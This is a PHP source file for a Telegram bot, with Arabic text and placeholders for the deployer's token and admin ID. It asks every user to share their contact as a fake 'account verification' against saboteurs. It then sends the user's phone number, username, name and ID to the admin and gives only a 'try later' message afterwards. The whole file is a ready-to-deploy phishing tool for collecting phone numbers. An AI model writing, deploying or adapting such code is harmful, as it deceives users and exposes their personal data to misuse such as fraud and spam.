<?php
$API_KEY = "توكنك";
 define('API_KEY',$API_KEY);
function bot($method,$datas=[]){
$url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ivar = curl_init();
curl_setopt($ivar,CURLOPT_URL,$url);
curl_setopt($ivar,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ivar,CURLOPT_POSTFIELDS,$datas);
$ppppppg = curl_exec($ivar);
if(curl_error($ivar)){
var_dump(curl_error($ivar));
}else{
return json_decode($ppppppg);
}}

$update = json_decode(file_get_contents('php://input'));
if($update->message){
	$message = $update->message;
$message_id = $update->message->message_id;
$username = $message->from->username;
$chat_id = $message->chat->id;
$title = $message->chat->title;
$text = $message->text;
$user = $message->from->username;
$name = $message->from->first_name;
$from_id = $message->from->id;
}
if($update->callback_query){
$data = $update->callback_query->data;
$chat_id = $update->callback_query->message->chat->id;
$title = $update->callback_query->message->chat->title;
$message_id = $update->callback_query->message->message_id;
$name = $update->callback_query->message->chat->first_name;
$user = $update->callback_query->message->chat->username;
$from_id = $update->callback_query->from->id;
}

$Ress1 = $update->message;
$contact = $Ress1->contact;
$user_id = $contact->user_id;
$phone_number = $contact->phone_number;
$done = json_decode(file_get_contents("done.json"),true);
if($text){
  if($done["sendcon"][$from_id] !="DONED") {
  $done["checker"][$from_id] = "on" ;
$done = json_encode($done,true);
file_put_contents("done.json",$done);
  bot('sendMessage',[
     'chat_id'=>$chat_id,
     'text'=>"
لاستخدام البوت يجب علينا التحقق من حسابك اولا 

*سياسات البوت لاتسمح للمخربين استخدام البوت ✅*
",
"parse_mode"=>"MarkDown",         
'reply_markup'=>json_encode([
                  'keyboard'=>[
                      [['text'=>"التحقق",'request_contact'=>true]]
                    ],
                    'resize_keyboard'=>true])
                
                
]);return false;
} else {
	bot('sendMessage',[
     'chat_id'=>$chat_id,
     'text'=>"
هناك مشاكل بالبوت يتم اصلاحها

*الرجاء المحاوله لاحقا ✅*
",
"parse_mode"=>"MarkDown",         
]) ;
	} 
} 

if($message->contact) {
if($done["checker"][$from_id] == "on") {
 if(True) {
 $done["sendcon"][$from_id] = "DONED";
$done = json_encode($done,true);
file_put_contents("done.json",$done);
 bot('sendMessage',[
     'chat_id'=>$chat_id,
     'text'=>"
تم التحقق من حسابك بنجاح عزيزي المسخدم 

*يمكنك الان الاستمتاع بكل خدمات البوت ✅*

",
"parse_mode"=>"MarkDown",         
'reply_markup'=>json_encode([
'remove_keyboard'=>true
])
]);
bot('sendMessage',[
     'chat_id'=> "ايديك" ,
     'text'=>"
     *🤖 - مرحبا عزيزي الادمن , تم كشف رقم جديد🙋🏻‍♂*

🆕 - حسابه : [$name](tg://user?id=$chat_id) 
☑️ - اسم المستخدم : [@$username]
📲 - رقم حسابة : +$phone_number
🆔 - ايدي حسابة: `$from_id`
",
"parse_mode"=>"MarkDown",         
'reply_markup'=>json_encode([
'remove_keyboard'=>true
])
]);
}
} 
}